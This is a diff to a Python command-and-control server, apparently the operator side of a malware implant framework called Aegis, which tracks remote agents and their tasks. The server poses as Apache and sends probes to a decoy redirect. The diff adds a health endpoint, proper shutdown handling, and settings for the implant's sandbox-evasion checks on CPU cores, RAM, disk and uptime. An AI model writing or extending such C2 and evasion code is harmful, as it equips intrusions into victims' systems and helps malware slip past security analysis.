@@ -20,6 +20,7 @@ import config_editor
 AGENTS = {}  # {node_id_hex: {"last_seen": timestamp, "info": {...}, "tasks": []}}
 ACTIVE_AGENT = None
 SERVER_RUNNING = True
+HTTPD_INSTANCE = None # Keep track of the server instance to shut it down properly
 
 # ── Resolve absolute path to project root ─────────────────────────────────
 # This ensures the server works regardless of which directory it's launched from.
@@ -110,6 +111,25 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
         return "Apache"
 
     def do_GET(self):
+        # ── Health Check ──────────────────────────────────────────────────
+        if self.path == '/health':
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.end_headers()
+
+            status = {
+                "status": "active",
+                "uptime": "TODO", # Ideally track start time
+                "agents_online": len(AGENTS),
+                "timestamp": datetime.now().isoformat(),
+                "config": {
+                    "primary_host": config_editor.get_config_value("AEGIS_C2_PRIMARY_HOST"),
+                    "primary_port": config_editor.get_config_value("AEGIS_C2_PRIMARY_PORT"),
+                }
+            }
+            self.wfile.write(json.dumps(status, indent=2).encode())
+            return
+
         # Handle GET requests (e.g. browser/curl probes) gracefully
         # Return a decoy redirect to a benign site
         self.send_response(302)
@@ -328,6 +348,7 @@ class AegisC2Handler(http.server.BaseHTTPRequestHandler):
 
 
 def run_server(port=443):
+    global HTTPD_INSTANCE
     # Use absolute paths for SSL certs
     cert_path = os.path.join(PROJECT_ROOT, "server.pem")
 
@@ -344,6 +365,7 @@ def run_server(port=443):
 
     try:
         httpd = ReusableHTTPServer(server_address, AegisC2Handler)
+        HTTPD_INSTANCE = httpd
     except OSError as e:
         if e.errno == errno.EADDRINUSE:
             print(f"{Colors.FAIL}[!] Error: Port {port} is already in use. C2 Server thread failed to bind.{Colors.ENDC}")
@@ -440,6 +462,10 @@ def menu_advanced_config():
         params = [
             "AEGIS_AA_RDTSC_THRESHOLD",
             "AEGIS_AA_SLEEP_CHECK_MS",
+            "AEGIS_AA_MIN_CPU_CORES",
+            "AEGIS_AA_MIN_RAM_MB",
+            "AEGIS_AA_MIN_DISK_GB",
+            "AEGIS_AA_MIN_UPTIME_SEC",
             "AEGIS_BEACON_INTERVAL_MS",
             "AEGIS_C2_PRIMARY_HOST",
             "AEGIS_C2_PRIMARY_PORT",
@@ -567,6 +593,10 @@ def main_loop():
             time.sleep(1)
         elif choice == '0':
             SERVER_RUNNING = False
+            # Proper shutdown
+            if HTTPD_INSTANCE:
+                HTTPD_INSTANCE.shutdown()
+                HTTPD_INSTANCE.server_close()
             sys.exit(0)
 
 if __name__ == "__main__":
@@ -579,4 +609,7 @@ if __name__ == "__main__":
         main_loop()
     except KeyboardInterrupt:
         SERVER_RUNNING = False
+        if HTTPD_INSTANCE:
+            HTTPD_INSTANCE.shutdown()
+            HTTPD_INSTANCE.server_close()
         print("\nExiting...")
